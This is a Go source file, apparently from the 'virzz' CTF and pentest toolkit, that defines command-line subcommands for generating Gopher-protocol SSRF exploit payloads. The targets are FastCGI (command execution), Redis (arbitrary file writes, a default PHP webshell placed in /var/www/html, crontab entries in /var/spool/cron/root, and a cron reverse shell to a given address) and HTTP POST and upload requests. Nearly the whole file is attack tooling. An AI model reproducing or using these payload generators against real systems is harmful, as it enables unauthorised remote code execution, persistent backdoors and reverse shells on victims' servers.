package cmd

import (
	"fmt"
	"net/url"

	"github.com/spf13/cobra"
	"github.com/virink/virzz/common"
	"github.com/virink/virzz/utils"
	"github.com/virink/virzz/web/gopher"
)

func init() {
	var (
		command   string
		filename  string
		urlencode int

		filepath    string
		content     string
		reverseAddr string

		datas map[string]string
	)

	var gopherCmd = &cobra.Command{
		Use:   "gopher",
		Short: "Generate Gopher Exp",
	}

	var fastCGICmd = &cobra.Command{
		Use:   "fcgi [addr]",
		Short: "Gopher Exp FastCGI",
		Args:  cobra.MinimumNArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			addr := args[0]
			_, _, err := utils.ParseAddr(addr)
			if err != nil {
				return err
			}
			if filename == "" {
				filename = "/usr/share/php/PEAR.php"
			}
			r, err := gopher.ExpFastCGI(addr, command, filename)
			if err != nil {
				return err
			}
			for i := 0; i < urlencode; i++ {
				r = url.QueryEscape(r)
			}
			return common.Output(r)
		},
	}

	var redisCmd = &cobra.Command{
		Use:   "redis",
		Short: "Gopher Exp Redis",
	}

	var redisWriteCmd = &cobra.Command{
		Use:   "write [addr]",
		Short: "Gopher Exp Redis Write Any File",
		Args:  cobra.MinimumNArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			addr := args[0]
			_, _, err := utils.ParseAddr(addr)
			if err != nil {
				return err
			}
			if filename == "" {
				filename = "virzz.txt"
			}
			if filepath == "" {
				filepath = "/var/www/html/"
			}
			if content == "" {
				content = "Hello world"
			}
			r, err := gopher.ExpRedisCmd(addr, filepath, filename, content)
			if err != nil {
				return err
			}
			for i := 0; i < urlencode; i++ {
				r = url.QueryEscape(r)
			}
			return common.Output(r)
		},
	}

	var redisWebshellCmd = &cobra.Command{
		Use:   "webshell [addr]",
		Short: "Gopher Exp Redis Write Webshell",
		Args:  cobra.MinimumNArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			addr := args[0]
			_, _, err := utils.ParseAddr(addr)
			if err != nil {
				return err
			}
			if filename == "" {
				filename = "virzz.php"
			}
			if filepath == "" {
				filepath = "/var/www/html/"
			}
			if content == "" {
				content = "\r\n<?php system($_GET['cmd']);?>\r\n"
			}
			r, err := gopher.ExpRedisCmd(addr, filepath, filename, content)
			if err != nil {
				return err
			}
			for i := 0; i < urlencode; i++ {
				r = url.QueryEscape(r)
			}
			return common.Output(r)
		},
	}

	var redisReverseCmd = &cobra.Command{
		Use:   "revese [addr]",
		Short: "Gopher Exp Redis Write Crontab Revese Shell",
		Args:  cobra.MinimumNArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			addr := args[0]
			_, _, err := utils.ParseAddr(addr)
			if err != nil {
				return err
			}
			if filename == "" {
				filename = "root"
			}
			if filepath == "" {
				filepath = "/var/spool/cron/"
			}
			if reverseAddr == "" {
				return fmt.Errorf("must need Reverse Addr")
			}
			r, err := gopher.ExpRedisReverseShell(addr, filepath, filename, reverseAddr)
			if err != nil {
				return err
			}
			for i := 0; i < urlencode; i++ {
				r = url.QueryEscape(r)
			}
			return common.Output(r)
		},
	}

	/*
		Crontab
		可进行利用的cron有如下几个地方：
		- /etc/crontab
		- /etc/cron.d/*
		- centos系统下root用户的cron文件
			- /var/spool/cron/root
		- debian系统下root用户的cron文件
			- /var/spool/cron/crontabs/root
	*/
	var redisCrontabCmd = &cobra.Command{
		Use:   "cron [addr]",
		Short: "Gopher Exp Redis Write Crontab",
		Args:  cobra.MinimumNArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			addr := args[0]
			_, _, err := utils.ParseAddr(addr)
			if err != nil {
				return err
			}
			if filename == "" {
				filename = "root"
			}
			if filepath == "" {
				filepath = "/var/spool/cron/"
			}
			if content == "" {
				content = "id > /var/www/html/virzz.txt"
			}
			r, err := gopher.ExpRedisCmd(addr, filepath, filename, content)
			if err != nil {
				return err
			}
			return common.Output(r)
		},
	}

	// httpPostCmd
	var httpPostCmd = &cobra.Command{
		Use:   "post [url]",
		Short: "Gopher Exp HTTP POST",
		Args:  cobra.MinimumNArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			host, uri, err := utils.ParseURLToHostAndURI(args[0])
			if err != nil {
				return err
			}
			if len(datas) == 0 {
				return cmd.Help()
			}
			r, err := gopher.ExpHTTPPost(host, uri, datas)
			if err != nil {
				return err
			}
			for i := 0; i < urlencode; i++ {
				r = url.QueryEscape(r)
			}
			return common.Output(r)
		},
	}

	// httpUploadCmd
	var httpUploadCmd = &cobra.Command{
		Use:   "upload [url]",
		Short: "Gopher Exp HTTP Upload",
		Args:  cobra.MinimumNArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			host, uri, err := utils.ParseURLToHostAndURI(args[0])
			if err != nil {
				return err
			}
			if len(datas) == 0 {
				return cmd.Help()
			}
			r, err := gopher.ExpHTTPUpload(host, uri, datas)
			if err != nil {
				return err
			}
			for i := 0; i < urlencode; i++ {
				r = url.QueryEscape(r)
			}
			return common.Output(r)
		},
	}

	gopherCmd.PersistentFlags().CountVarP(&urlencode, "urlencode", "e", "URL Encode (-e , -ee -eee)")

	fastCGICmd.Flags().StringVarP(&command, "command", "c", "id", "Command")
	fastCGICmd.Flags().StringVarP(&filename, "filename", "f", "", "Delimiter")

	redisCmd.PersistentFlags().StringVarP(&filename, "filename", "f", "", "Filename")
	redisCmd.PersistentFlags().StringVarP(&filepath, "filepath", "p", "", "Filepath")
	redisCmd.PersistentFlags().StringVarP(&content, "content", "c", "", "Content")

	redisReverseCmd.Flags().StringVarP(&reverseAddr, "reverse", "r", "", "Reverse Addr")

	httpPostCmd.Flags().StringToStringVarP(&datas, "data", "d", datas, "Post data")
	httpUploadCmd.Flags().StringToStringVarP(&datas, "data", "d", datas, "Post data/upload file")

	redisCmd.AddCommand(redisWriteCmd, redisWebshellCmd, redisCrontabCmd, redisReverseCmd)
	gopherCmd.AddCommand(fastCGICmd, redisCmd, httpPostCmd, httpUploadCmd)

	rootCmd.AddCommand(gopherCmd)
}
